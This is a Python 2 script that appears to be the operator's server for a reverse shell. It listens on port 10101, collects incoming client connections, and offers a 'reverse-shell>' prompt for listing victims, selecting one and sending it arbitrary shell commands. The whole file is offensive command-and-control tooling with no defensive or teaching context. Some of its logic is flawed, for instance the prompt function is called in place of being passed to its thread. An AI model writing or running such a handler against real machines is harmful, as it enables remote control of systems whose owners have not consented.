#!/usr/bin/python

import socket
import threading
import sys


class Server(object):
    sckt = None
    addresses = []
    connections = []

    # creates socket, waits for connections from clients, and initiates the prompt for the user
    def start(self):
        print("Starting server...")
        self.create_socket()
        self.create_threads()

    # creates a socket to accept connections from clients
    def create_socket(self):
        print("Configuring socket...")
        try:
            self.sckt = socket.socket()
            self.sckt.bind(("", 10101))
            self.sckt.listen(5)
        except socket.error:
            print("- error: unable to configure socket")
            print("- try again in 1 to 3 minutes")
            sys.exit()

    # creates 2 threads to simultaneously accept connections from clients and manage the prompt for the user
    def create_threads(self):
        print("Creating threads...")
        for number in range(2):
            thread = None
            if number == 0:
                thread = threading.Thread(target=self.accept_connections)
            elif number == 1:
                thread = threading.Thread(target=self.show_prompt())
            thread.daemon = True
            thread.start()

    # accepts connections from clients and adds them to the lists of available connections and addresses
    def accept_connections(self):
        try:
            connection, address = self.sckt.accept()
            self.connections.append(connection)
            self.addresses.append(address)
        except socket.error:
            print("- error: unable to accept connection")

    # manages the prompt for the user based on what he or she entered
    def show_prompt(self):
        while True:
            command = raw_input("\nreverse-shell> ")
            if command == "quit":
                self.close_connections()
                break
            elif command == "list":
                self.show_connections()
            elif command[:6] == "select":
                if not self.error_check_for_send_commands(command[7:]):
                    self.send_commands(int(command[7:]))
            else:
                print("- command not recognized")

    # shows a list of available connections to the user on the prompt
    def show_connections(self):
        print("---------- Connections ----------")
        for index, address in enumerate(self.addresses):
            try:
                self.connections[index].send("?")
                self.connections[index].recv(1024)
            except socket.error:
                self.remove_connection(index)
                continue
            print(str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))
        if len(self.connections) == 0:
            print("    no available connections")

    # checks whether the user entered the argument for the 'select' command appropriately
    def error_check_for_send_commands(self, argument):
        if not argument.isdigit():
            print("- " + argument + " is not a number")
            return True
        index = int(argument)
        if index >= len(self.connections):
            print("- connection " + str(index) + " is not an available connection")
            print("- use command 'list' to see all available connections")
            return True
        elif self.connections[index] is None:
            print("- connection " + str(index) + " is no longer available")
            print("- use command 'list' to see all available connections")
            self.remove_connection(index)
            return True
        return False

    # sends the commands the user entered for the selected client
    def send_commands(self, index):
        print("")
        while True:
            command = raw_input(self.addresses[index][0] + "> ")
            if command == "done":
                break
            elif len(command) > 0:
                try:
                    self.connections[index].send(command)
                    response = str(self.connections[index].recv(1024))
                    print(response)
                except socket.error:
                    print("- error: lost connection")
                    break

    # removes a connection by index from the lists of available connections and addresses
    def remove_connection(self, index):
        del self.addresses[index]
        del self.connections[index]

    # closes all available connections and the socket once the user has finished
    def close_connections(self):
        for connection in self.connections:
            connection.close()
        self.sckt.close()


def main():
    server = Server()
    server.start()


if __name__ == "__main__":
    main()
